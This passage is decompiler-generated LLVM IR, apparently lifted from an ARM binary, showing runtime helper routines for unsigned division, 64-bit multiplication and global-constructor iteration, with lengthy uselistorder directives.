  %v5_1c250 = phi i32 [ %v1_1c240, %bb74 ], [ %v3_1c24c, %.thread67 ], [ %v1_1c294.v6_1c294.v6_1c29c.v6_1c2a4, %dec_label_pc_1c2b8 ], [ 0, %bb84 ], [ %v1_1c2ec, %dec_label_pc_1c2e8 ], [ %v2_1c2e8, %bb89 ]
  ret i32 %v5_1c250

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_1c258.preheader
  %v0_1c26c.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_1c258.preheader ], [ %v4_1c260, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_1c258.preheader ], [ %v2_1c26411, %.thread1.thread9 ]
  br label %dec_label_pc_1c26cthread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_1c258.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_1c26411, %.thread1.thread9 ], [ 0, %dec_label_pc_1c258.preheader ]
  %v0_1c26c.pr33100 = phi i32 [ %v4_1c260, %.thread1.thread9 ], [ %arg2, %dec_label_pc_1c258.preheader ]
  %v4_1c25c = icmp ult i32 %v0_1c26c.pr33100, %v1_1c240
  br i1 %v4_1c25c, label %bb78, label %dec_label_pc_1c26cthread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_1c260 = and i32 %v0_1c26c.pr33100, 268435456
  %v3_1c260 = icmp eq i32 %v2_1c260, 0
  %v4_1c260 = mul i32 %v0_1c26c.pr33100, 16
  br i1 %v3_1c260, label %.thread1.thread9, label %dec_label_pc_1c26c.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_1c26411 = add i32 %storemerge101, 4
  %v2_1c258 = icmp ugt i32 %v4_1c260, 268435455
  br i1 %v2_1c258, label %.thread, label %bb77

dec_label_pc_1c26cthread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_1c26cthread-pre-split.loopexit

dec_label_pc_1c26cthread-pre-split.loopexit:      ; preds = %dec_label_pc_1c26cthread-pre-split.loopexit.loopexit, %.thread
  %v0_1c26c.pr3398 = phi i32 [ %v0_1c26c.pr33.lcssa, %.thread ], [ %v0_1c26c.pr33100, %dec_label_pc_1c26cthread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_1c26cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1c26cthread-pre-split

dec_label_pc_1c26cthread-pre-split:               ; preds = %.thread4, %dec_label_pc_1c26cthread-pre-split.loopexit
  %v1_1c27839 = phi i32 [ %storemerge95, %dec_label_pc_1c26cthread-pre-split.loopexit ], [ %v2_1c278, %.thread4 ]
  %v0_1c26c.pr = phi i32 [ %v0_1c26c.pr3398, %dec_label_pc_1c26cthread-pre-split.loopexit ], [ %v3_1c274, %.thread4 ]
  br label %dec_label_pc_1c26c

dec_label_pc_1c26c.loopexit:                      ; preds = %bb78
  br label %dec_label_pc_1c26c

dec_label_pc_1c26c:                               ; preds = %dec_label_pc_1c26c.loopexit, %dec_label_pc_1c26cthread-pre-split
  %v0_1c280.pr = phi i32 [ %v1_1c27839, %dec_label_pc_1c26cthread-pre-split ], [ %storemerge101, %dec_label_pc_1c26c.loopexit ]
  %v1_1c274 = phi i32 [ %v0_1c26c.pr, %dec_label_pc_1c26cthread-pre-split ], [ %v4_1c260, %dec_label_pc_1c26c.loopexit ]
  %v2_1c26c = icmp slt i32 %v1_1c274, 0
  br i1 %v2_1c26c, label %dec_label_pc_1c280, label %bb79

bb79:                                             ; preds = %dec_label_pc_1c26c
  %v4_1c270 = icmp ult i32 %v1_1c274, %v1_1c240
  br i1 %v4_1c270, label %.thread4, label %dec_label_pc_1c280

.thread4:                                         ; preds = %bb79
  %v3_1c274 = mul i32 %v1_1c274, 2
  %v2_1c278 = add i32 %v0_1c280.pr, 1
  br label %dec_label_pc_1c26cthread-pre-split

dec_label_pc_1c280:                               ; preds = %bb79, %dec_label_pc_1c26c
  %v2_1c280 = add i32 %v0_1c280.pr, -3
  %v5_1c284 = icmp slt i32 %v0_1c280.pr, 3
  br i1 %v5_1c284, label %dec_label_pc_1c2c4, label %dec_label_pc_1c288

dec_label_pc_1c288:                               ; preds = %dec_label_pc_1c280, %bb83
  %v6_1c2b0 = phi i32 [ %v0_1c2b8, %bb83 ], [ %v2_1c280, %dec_label_pc_1c280 ]
  %v1_1c28c = phi i32 [ %v1_1c294.v6_1c294.v6_1c29c.v6_1c2a4, %bb83 ], [ %v1_1c240, %dec_label_pc_1c280 ]
  %v3_1c2ac12 = phi i32 [ %v3_1c2ac, %bb83 ], [ %v1_1c274, %dec_label_pc_1c280 ]
  %v3_1c288 = icmp ult i32 %v1_1c28c, %v3_1c2ac12
  %v3_1c28c = select i1 %v3_1c288, i32 0, i32 %v3_1c2ac12
  %v1_1c294 = sub i32 %v1_1c28c, %v3_1c28c
  %v4_1c290 = udiv i32 %v3_1c2ac12, 2
  %v6_1c290 = icmp ult i32 %v1_1c294, %v4_1c290
  %v6_1c294 = select i1 %v6_1c290, i32 0, i32 %v4_1c290
  %v1_1c294.v6_1c294 = sub i32 %v1_1c294, %v6_1c294
  %.demorgan = and i1 %v3_1c288, %v6_1c290
  %v4_1c298 = udiv i32 %v3_1c2ac12, 4
  %v6_1c298 = icmp ult i32 %v1_1c294.v6_1c294, %v4_1c298
  %v6_1c29c = select i1 %v6_1c298, i32 0, i32 %v4_1c298
  %v1_1c294.v6_1c294.v6_1c29c = sub i32 %v1_1c294.v6_1c294, %v6_1c29c
  %.demorgan71 = and i1 %.demorgan, %v6_1c298
  %v4_1c2a0 = udiv i32 %v3_1c2ac12, 8
  %v6_1c2a0 = icmp ult i32 %v1_1c294.v6_1c294.v6_1c29c, %v4_1c2a0
  %v6_1c2a4 = select i1 %v6_1c2a0, i32 0, i32 %v4_1c2a0
  %v1_1c294.v6_1c294.v6_1c29c.v6_1c2a4 = sub i32 %v1_1c294.v6_1c294.v6_1c29c, %v6_1c2a4
  %.demorgan72 = and i1 %.demorgan71, %v6_1c2a0
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_1c288
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_1c288, %bb80
  %v2_1c2a8 = add i32 %v1_1c294.v6_1c294.v6_1c29c.v6_1c2a4, -1
  %v4_1c2a8 = sub i32 0, %v1_1c294.v6_1c294.v6_1c29c.v6_1c2a4
  %v5_1c2a8 = and i32 %v1_1c294.v6_1c294.v6_1c29c.v6_1c2a4, %v4_1c2a8
  %v3_1c2ac = udiv i32 %v3_1c2ac12, 16
  %v5_1c2b0 = icmp slt i32 %v1_1c294.v6_1c294.v6_1c29c.v6_1c2a4, 1
  br i1 %v5_1c2b0, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_1c2b0 = add i32 %v6_1c2b0, -4
  %v9_1c2b0 = sub i32 3, %v6_1c2b0
  %v10_1c2b0 = and i32 %v9_1c2b0, %v6_1c2b0
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_1c2b8 = phi i32 [ %v6_1c2b0, %bb81 ], [ %v7_1c2b0, %bb82 ]
  %v0_1c2b415.in = phi i32 [ %v2_1c2a8, %bb81 ], [ %v7_1c2b0, %bb82 ]
  %v1_1c2b414.in = phi i32 [ %v5_1c2a8, %bb81 ], [ %v10_1c2b0, %bb82 ]
  %v1_1c2b414 = icmp slt i32 %v1_1c2b414.in, 0
  %v0_1c2b415 = icmp slt i32 %v0_1c2b415.in, 0
  %v2_1c2b4 = xor i1 %v0_1c2b415, %v1_1c2b414
  br i1 %v2_1c2b4, label %dec_label_pc_1c2b8, label %dec_label_pc_1c288

dec_label_pc_1c2b8:                               ; preds = %bb83
  %v1_1c2b8 = urem i32 %v0_1c2b8, 4
  %v2_1c2b8 = icmp eq i32 %v1_1c2b8, 0
  br i1 %v2_1c2b8, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_1c2b8
  %v3_1c2bc = icmp eq i32 %v1_1c294.v6_1c294.v6_1c29c.v6_1c2a4, 0
  br i1 %v3_1c2bc, label %bb76, label %dec_label_pc_1c2c4

dec_label_pc_1c2c4:                               ; preds = %bb84, %dec_label_pc_1c280
  %v0_1c2d8 = phi i32 [ %v3_1c2ac, %bb84 ], [ %v1_1c274, %dec_label_pc_1c280 ]
  %v1_1c2d4 = phi i32 [ %v1_1c294.v6_1c294.v6_1c29c.v6_1c2a4, %bb84 ], [ %v1_1c240, %dec_label_pc_1c280 ]
  %v0_1c2c4 = phi i32 [ %v0_1c2b8, %bb84 ], [ %v2_1c280, %dec_label_pc_1c280 ]
  %v5_1c2c8 = icmp slt i32 %v0_1c2c4, -2
  br i1 %v5_1c2c8, label %dec_label_pc_1c2e8, label %dec_label_pc_1c2cc

dec_label_pc_1c2cc:                               ; preds = %dec_label_pc_1c2c4
  %v8_1c2c4 = icmp eq i32 %v0_1c2c4, -2
  br i1 %v8_1c2c4, label %dec_label_pc_1c2dc, label %dec_label_pc_1c2d0

dec_label_pc_1c2d0:                               ; preds = %dec_label_pc_1c2cc
  %v3_1c2d0 = icmp ult i32 %v1_1c2d4, %v0_1c2d8
  br i1 %v3_1c2d0, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_1c2d0
  %v2_1c2d0 = sub i32 %v1_1c2d4, %v0_1c2d8
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_1c2d0, %bb85
  %v0_1c2dc52 = phi i32 [ %v1_1c2d4, %dec_label_pc_1c2d0 ], [ %v2_1c2d0, %bb85 ]
  %v3_1c2d8 = udiv i32 %v0_1c2d8, 2
  br label %dec_label_pc_1c2dc

dec_label_pc_1c2dc:                               ; preds = %dec_label_pc_1c2cc, %bb86
  %v0_1c2e4 = phi i32 [ %v0_1c2d8, %dec_label_pc_1c2cc ], [ %v3_1c2d8, %bb86 ]
  %v1_1c2e0 = phi i32 [ %v1_1c2d4, %dec_label_pc_1c2cc ], [ %v0_1c2dc52, %bb86 ]
  %v3_1c2dc = icmp ult i32 %v1_1c2e0, %v0_1c2e4
  br i1 %v3_1c2dc, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_1c2dc
  %v2_1c2dc = sub i32 %v1_1c2e0, %v0_1c2e4
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_1c2dc, %bb87
  %v0_1c2e855 = phi i32 [ %v1_1c2e0, %dec_label_pc_1c2dc ], [ %v2_1c2dc, %bb87 ]
  %v3_1c2e4 = udiv i32 %v0_1c2e4, 2
  br label %dec_label_pc_1c2e8

dec_label_pc_1c2e8:                               ; preds = %dec_label_pc_1c2c4, %bb88
  %v2_1c2ec = phi i32 [ %v0_1c2d8, %dec_label_pc_1c2c4 ], [ %v3_1c2e4, %bb88 ]
  %v1_1c2ec = phi i32 [ %v1_1c2d4, %dec_label_pc_1c2c4 ], [ %v0_1c2e855, %bb88 ]
  %v3_1c2e8 = icmp ult i32 %v1_1c2ec, %v2_1c2ec
  br i1 %v3_1c2e8, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_1c2e8
  %v2_1c2e8 = sub i32 %v1_1c2ec, %v2_1c2ec
  br label %bb76

dec_label_pc_1c2f4:                               ; preds = %entry
  %v0_1c2f4 = load i32, i32* @lr, align 4
  %v0_1c2f8 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_1c2f4)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1c2ec, { 1, 2, 0 }
  uselistorder i32 %v0_1c2d8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_1c2b8, { 1, 0, 2 }
  uselistorder i32 %v7_1c2b0, { 1, 0 }
  uselistorder i32 %v3_1c2ac, { 1, 0 }
  uselistorder i32 %v1_1c294.v6_1c294.v6_1c29c.v6_1c2a4, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_1c2a0, { 1, 0 }
  uselistorder i32 %v4_1c298, { 1, 0 }
  uselistorder i32 %v4_1c290, { 1, 0 }
  uselistorder i32 %v6_1c2b0, { 3, 0, 2, 1 }
  uselistorder i32 %v2_1c280, { 1, 0 }
  uselistorder i32 %v1_1c274, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_1c260, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1c26c.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1c240, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 ()* @__aeabi_ldiv0, { 3, 2, 1, 0 }
  uselistorder i32* @lr, { 122, 123, 124, 79, 80, 81, 24, 26, 25, 18, 19, 20, 21, 10, 11, 82, 85, 86, 87, 3, 88, 89, 90, 91, 22, 27, 28, 142, 176, 177, 92, 63, 64, 65, 141, 152, 153, 154, 54, 55, 93, 94, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 148, 149, 144, 145, 146, 147, 157, 158, 155, 156, 23, 29, 30, 31, 150, 151, 159, 160, 12, 13, 14, 15, 16, 32, 33, 34, 161, 162, 163, 164, 165, 175, 35, 36, 178, 184, 167, 166, 0, 168, 169, 1, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 4, 195, 196, 197, 5, 198, 199, 200, 6, 201, 202, 203, 204, 205, 206, 207, 208, 102, 170, 172, 125, 7, 127, 128, 126, 209, 210, 211, 183, 222, 223, 212, 213, 66, 37, 38, 73, 214, 220, 67, 68, 69, 70, 179, 180, 181, 182, 118, 221, 83, 84, 129, 130, 119, 120, 121, 100, 101, 98, 99, 173, 174, 103, 104, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 2, 171, 39, 40, 105, 106, 95, 96, 97, 59, 56, 41, 74, 215, 42, 43, 44, 45, 46, 47, 48, 49, 50, 219, 53, 51, 216, 217, 218, 58, 57, 60, 52, 61, 62, 75, 76, 77, 78, 8, 9, 17, 143, 71, 72 }
  uselistorder i32 -2, { 0, 8, 3, 5, 6, 4, 13, 9, 7, 12, 10, 14, 16, 15, 17, 1, 2, 11, 18 }
  uselistorder i32 8, { 4, 73, 33, 5, 6, 21, 7, 74, 34, 8, 9, 22, 10, 0, 56, 55, 108, 104, 57, 181, 182, 183, 184, 1, 2, 185, 186, 187, 188, 189, 11, 190, 105, 48, 49, 75, 12, 254, 255, 256, 106, 235, 28, 191, 192, 193, 194, 27, 195, 236, 203, 121, 232, 233, 50, 107, 58, 59, 13, 14, 60, 15, 61, 109, 258, 110, 111, 112, 113, 257, 114, 115, 116, 117, 118, 119, 120, 234, 51, 122, 123, 237, 238, 124, 125, 30, 126, 127, 239, 94, 96, 95, 97, 98, 240, 241, 242, 243, 244, 99, 100, 101, 128, 129, 262, 40, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 41, 196, 206, 207, 208, 209, 210, 211, 212, 213, 214, 31, 215, 76, 245, 246, 247, 248, 249, 250, 287, 159, 35, 130, 16, 172, 179, 131, 132, 39, 281, 280, 278, 279, 173, 174, 175, 259, 260, 261, 282, 283, 284, 17, 204, 205, 3, 285, 44, 45, 42, 43, 23, 24, 37, 38, 46, 288, 253, 197, 198, 216, 217, 77, 218, 219, 220, 221, 29, 222, 62, 63, 223, 224, 225, 47, 226, 227, 228, 229, 36, 25, 26, 230, 231, 64, 251, 252, 133, 199, 200, 32, 201, 202, 164, 65, 66, 67, 68, 69, 70, 71, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 18, 88, 89, 134, 135, 136, 102, 137, 138, 139, 140, 141, 144, 145, 146, 103, 147, 148, 149, 180, 142, 143, 150, 151, 152, 153, 154, 155, 52, 286, 156, 157, 158, 160, 161, 162, 163, 167, 168, 169, 170, 165, 166, 171, 90, 91, 53, 92, 93, 54, 19, 72, 20, 176, 177, 178 }
  uselistorder i32 3, { 55, 29, 91, 56, 92, 57, 47, 19, 33, 34, 84, 30, 85, 86, 31, 87, 106, 96, 88, 20, 97, 0, 68, 69, 70, 98, 99, 36, 35, 58, 3, 2, 1, 4, 89, 37, 71, 48, 100, 101, 27, 26, 102, 103, 104, 105, 5, 6, 21, 7, 8, 59, 60, 109, 61, 62, 63, 64, 65, 66, 93, 17, 38, 94, 39, 72, 40, 73, 41, 74, 42, 75, 43, 76, 18, 77, 110, 23, 82, 107, 108, 22, 90, 95, 9, 10, 11, 49, 50, 83, 51, 52, 111, 44, 53, 78, 24, 25, 112, 79, 80, 12, 81, 13, 14, 15, 45, 16, 54, 67, 32, 46, 28 }
  uselistorder i32 -3, { 3, 16, 0, 2, 4, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 2, { 4, 5, 6, 7, 8, 145, 9, 10, 11, 12, 13, 14, 146, 15, 16, 17, 18, 19, 56, 128, 57, 20, 215, 216, 185, 74, 75, 187, 136, 137, 186, 76, 188, 189, 190, 191, 192, 55, 98, 152, 21, 154, 153, 193, 194, 195, 22, 161, 162, 163, 89, 90, 23, 237, 24, 238, 99, 217, 218, 219, 100, 220, 25, 166, 58, 59, 60, 61, 62, 63, 224, 225, 155, 226, 26, 227, 138, 139, 140, 27, 141, 222, 223, 164, 165, 221, 156, 157, 158, 159, 229, 160, 228, 101, 102, 0, 167, 168, 230, 129, 231, 91, 232, 103, 149, 104, 150, 151, 28, 92, 84, 233, 234, 235, 105, 85, 29, 64, 240, 241, 81, 242, 243, 67, 244, 66, 245, 65, 198, 205, 54, 206, 207, 30, 208, 236, 246, 1, 82, 93, 2, 239, 106, 107, 180, 108, 181, 109, 182, 97, 31, 68, 32, 142, 110, 169, 111, 170, 112, 171, 113, 172, 114, 173, 77, 174, 53, 33, 247, 78, 200, 34, 115, 201, 202, 35, 116, 203, 204, 94, 147, 36, 37, 69, 70, 71, 86, 72, 87, 73, 196, 197, 209, 210, 95, 38, 39, 40, 143, 41, 96, 211, 88, 83, 42, 212, 213, 214, 199, 43, 3, 44, 130, 117, 175, 131, 132, 133, 45, 134, 118, 176, 144, 46, 119, 120, 178, 177, 79, 80, 148, 135, 121, 179, 122, 47, 48, 49, 50, 51, 123, 124, 183, 184, 125, 52, 126, 127 }
  uselistorder i32 4, { 13, 14, 83, 391, 392, 185, 15, 16, 393, 394, 186, 17, 18, 76, 109, 260, 221, 77, 350, 19, 427, 428, 429, 112, 113, 114, 351, 352, 353, 354, 355, 356, 357, 0, 20, 73, 358, 359, 360, 361, 362, 363, 364, 72, 365, 115, 116, 117, 366, 367, 99, 368, 87, 369, 261, 262, 430, 431, 466, 467, 468, 100, 252, 438, 202, 21, 22, 265, 23, 24, 1, 328, 439, 440, 441, 442, 443, 370, 371, 372, 222, 223, 444, 445, 118, 101, 119, 120, 121, 122, 123, 124, 375, 125, 126, 382, 383, 102, 127, 203, 2, 204, 3, 205, 4, 206, 5, 446, 224, 269, 432, 433, 434, 435, 436, 25, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 450, 451, 452, 249, 250, 251, 447, 448, 449, 128, 129, 253, 254, 255, 256, 257, 258, 130, 259, 131, 132, 26, 133, 134, 27, 263, 264, 470, 135, 266, 267, 268, 136, 469, 437, 270, 271, 453, 272, 273, 274, 275, 276, 277, 110, 278, 454, 455, 456, 457, 103, 104, 207, 209, 208, 210, 211, 212, 213, 214, 215, 78, 216, 458, 85, 459, 460, 461, 137, 217, 279, 280, 281, 282, 283, 284, 471, 28, 462, 29, 97, 88, 89, 30, 478, 90, 75, 31, 32, 91, 92, 479, 480, 481, 482, 93, 483, 484, 485, 486, 94, 487, 488, 489, 490, 491, 33, 492, 493, 494, 495, 496, 95, 74, 497, 498, 499, 500, 501, 502, 34, 35, 96, 376, 377, 105, 395, 396, 397, 398, 106, 399, 400, 401, 402, 403, 404, 405, 406, 463, 465, 464, 407, 520, 521, 138, 139, 140, 285, 286, 287, 288, 316, 36, 289, 141, 290, 142, 79, 291, 329, 143, 330, 331, 6, 340, 341, 342, 343, 144, 145, 292, 146, 7, 147, 293, 37, 294, 80, 148, 149, 509, 511, 510, 507, 508, 332, 333, 334, 335, 472, 473, 474, 475, 512, 513, 514, 476, 477, 150, 151, 152, 384, 385, 386, 387, 388, 389, 8, 38, 390, 519, 408, 39, 40, 41, 42, 9, 153, 66, 43, 44, 336, 154, 45, 155, 156, 157, 158, 159, 409, 46, 410, 160, 411, 412, 413, 414, 415, 416, 417, 161, 418, 419, 420, 421, 422, 423, 67, 426, 162, 163, 425, 187, 424, 378, 379, 107, 380, 381, 373, 374, 319, 503, 504, 505, 164, 165, 166, 167, 98, 108, 295, 168, 170, 81, 169, 171, 172, 173, 174, 175, 176, 296, 188, 47, 48, 49, 189, 190, 191, 192, 297, 193, 345, 10, 298, 299, 300, 515, 346, 301, 302, 218, 303, 516, 304, 305, 306, 307, 308, 309, 317, 347, 310, 320, 311, 312, 517, 313, 314, 315, 518, 177, 178, 179, 506, 180, 181, 318, 321, 322, 348, 50, 194, 195, 196, 197, 198, 199, 200, 51, 201, 111, 326, 323, 324, 325, 219, 327, 52, 53, 84, 82, 54, 55, 337, 56, 57, 58, 59, 60, 182, 61, 183, 68, 86, 69, 70, 11, 12, 338, 62, 339, 184, 63, 344, 71, 64, 349, 65, 220 }
  uselistorder i32 16, { 6, 7, 8, 30, 9, 10, 4, 11, 12, 13, 31, 14, 15, 5, 16, 17, 60, 167, 168, 134, 135, 136, 0, 137, 138, 18, 19, 139, 140, 20, 141, 142, 100, 169, 188, 189, 170, 38, 98, 171, 34, 21, 22, 143, 144, 172, 173, 97, 23, 24, 25, 174, 151, 152, 92, 50, 175, 99, 1, 51, 39, 101, 176, 102, 103, 53, 54, 52, 177, 55, 93, 94, 95, 96, 178, 56, 57, 104, 105, 106, 107, 108, 109, 110, 190, 40, 41, 42, 191, 43, 192, 193, 44, 194, 195, 45, 196, 197, 198, 199, 200, 201, 145, 146, 147, 156, 157, 46, 158, 159, 179, 180, 181, 185, 186, 187, 182, 47, 160, 36, 130, 48, 111, 126, 112, 153, 154, 204, 35, 148, 149, 161, 162, 163, 164, 165, 166, 70, 183, 184, 113, 150, 33, 26, 123, 71, 72, 73, 37, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 2, 87, 88, 114, 3, 115, 61, 116, 62, 32, 117, 63, 118, 119, 120, 121, 64, 122, 65, 202, 205, 203, 66, 58, 124, 89, 90, 27, 49, 91, 68, 67, 69, 125, 28, 29, 127, 128, 129, 131, 132, 133, 59, 155 }
  uselistorder i32 268435456, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 268435455, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_1c2e8, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_1c2dc, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_1c288, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @__muldi3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_1c310 = udiv i32 %arg1, 65536
  %v3_1c314 = udiv i32 %arg3, 65536
  %tmp = mul i32 %v3_1c310, -65536
  %v5_1c318 = add i32 %tmp, -1
  %v6_1c318 = and i32 %v5_1c318, %arg1
  %tmp10 = mul i32 %v3_1c314, -65536
  %v5_1c31c = add i32 %tmp10, -1
  %v6_1c31c = and i32 %v5_1c31c, %arg3
  %v2_1c320 = mul i32 %v6_1c31c, %v6_1c318
  %v2_1c324 = mul i32 %v6_1c31c, %v3_1c310
  %v2_1c328 = mul i32 %v6_1c318, %v3_1c314
  %v2_1c330 = add i32 %v2_1c324, %v2_1c328
  %v3_1c330 = icmp ult i32 %v2_1c330, %v2_1c324
  br i1 %v3_1c330, label %bb, label %bb9

bb:                                               ; preds = %entry
  br label %bb9

bb9:                                              ; preds = %entry, %bb
  %v4_1c338 = mul i32 %v2_1c330, 65536
  %v5_1c338 = add i32 %v4_1c338, %v2_1c320
  ret i32 %v5_1c338

; uselistorder directives
  uselistorder i32 %v2_1c324, { 1, 0 }
  uselistorder i32 %v6_1c318, { 1, 0 }
  uselistorder i32 %v3_1c314, { 1, 0 }
  uselistorder i32 %v3_1c310, { 1, 0 }
  uselistorder i32 65536, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 30, 26, 31, 27, 32, 28, 33, 29, 34, 35, 36, 40, 37, 41, 38, 42, 39, 43, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
}

define i32 @__do_global_ctors_aux(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1c360 = load i32, i32* @r4, align 4
  store i32 %v3_1c360, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_2631c.1087 to i32), i32* %r4.global-to-local, align 4
  br i1 icmp eq (i32 add (i32 ptrtoint (i32* @global_var_d8c8.403 to i32), i32 1), i32 0), label %bb, label %.preheader

bb:                                               ; preds = %entry
  store i32 %v3_1c360, i32* %r4.global-to-local, align 4
  ret i32 %arg1

.preheader:                                       ; preds = %entry, %.preheader
  %v0_1c370 = phi i32 [ %v3_1c374, %.preheader ], [ ptrtoint (i32* @global_var_d8c8.403 to i32), %entry ]
  call void @__pseudo_branch(i32 %v0_1c370)
  %v0_1c374 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c374 = add i32 %v0_1c374, -4
  %v2_1c374 = inttoptr i32 %v1_1c374 to i32*
  %v3_1c374 = load i32, i32* %v2_1c374, align 4
  store i32 %v1_1c374, i32* %r4.global-to-local, align 4
  %v3_1c378 = icmp eq i32 %v3_1c374, -1
  br i1 %v3_1c378, label %dec_label_pc_1c380, label %.preheader

dec_label_pc_1c380:                               ; preds = %.preheader
  %v2_1c380 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1c380, i32* %r4.global-to-local, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v3_1c374, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 -1, { 236, 59, 60, 237, 238, 239, 240, 0, 74, 75, 1, 391, 241, 61, 62, 102, 392, 199, 2, 393, 103, 3, 4, 104, 343, 5, 6, 7, 110, 108, 105, 344, 181, 182, 109, 107, 106, 201, 345, 394, 202, 111, 203, 433, 435, 242, 243, 98, 63, 244, 112, 431, 8, 113, 437, 245, 246, 438, 439, 114, 449, 247, 9, 80, 349, 248, 350, 10, 249, 81, 115, 12, 13, 205, 76, 77, 204, 401, 83, 82, 78, 79, 250, 184, 185, 251, 252, 11, 406, 206, 253, 14, 116, 64, 65, 187, 254, 84, 117, 346, 440, 255, 256, 85, 15, 257, 207, 443, 258, 259, 208, 347, 16, 348, 444, 260, 99, 66, 261, 445, 17, 67, 262, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 263, 397, 399, 264, 90, 410, 266, 411, 412, 100, 91, 92, 413, 414, 415, 416, 417, 93, 209, 418, 194, 265, 210, 419, 420, 421, 267, 211, 212, 18, 446, 268, 269, 422, 423, 213, 118, 465, 119, 466, 120, 467, 121, 468, 122, 351, 19, 20, 270, 21, 123, 381, 382, 271, 272, 273, 73, 200, 384, 214, 215, 124, 22, 352, 23, 353, 89, 274, 24, 354, 275, 216, 276, 25, 26, 87, 68, 69, 277, 278, 279, 27, 28, 29, 125, 448, 126, 442, 127, 383, 128, 355, 129, 404, 130, 356, 131, 357, 132, 402, 133, 386, 134, 405, 135, 432, 136, 387, 217, 407, 137, 408, 280, 138, 424, 281, 139, 282, 283, 284, 285, 286, 287, 101, 288, 198, 140, 289, 30, 86, 94, 95, 398, 290, 425, 291, 218, 426, 70, 427, 428, 219, 31, 292, 293, 186, 195, 191, 32, 196, 35, 33, 34, 197, 220, 429, 430, 294, 36, 71, 72, 378, 409, 400, 141, 396, 142, 470, 143, 379, 144, 385, 145, 471, 146, 475, 476, 147, 369, 148, 388, 149, 472, 150, 376, 151, 367, 152, 368, 153, 366, 154, 377, 155, 395, 156, 295, 296, 37, 38, 157, 358, 297, 298, 299, 39, 300, 301, 158, 403, 159, 370, 160, 359, 161, 477, 162, 473, 163, 375, 164, 360, 165, 364, 436, 166, 474, 167, 481, 168, 441, 169, 371, 170, 380, 171, 434, 172, 480, 173, 361, 174, 389, 175, 447, 176, 469, 177, 478, 96, 479, 178, 362, 363, 40, 302, 303, 304, 221, 305, 306, 222, 307, 223, 183, 224, 225, 365, 308, 309, 41, 310, 342, 311, 97, 312, 313, 42, 314, 226, 390, 43, 315, 179, 316, 44, 317, 45, 46, 318, 47, 180, 319, 372, 373, 227, 320, 228, 229, 321, 230, 322, 374, 48, 49, 50, 323, 53, 324, 54, 339, 51, 325, 192, 340, 52, 193, 341, 188, 55, 326, 231, 327, 232, 328, 329, 330, 331, 332, 333, 334, 233, 335, 336, 56, 57, 58, 189, 190, 88, 337, 338, 234, 235 }
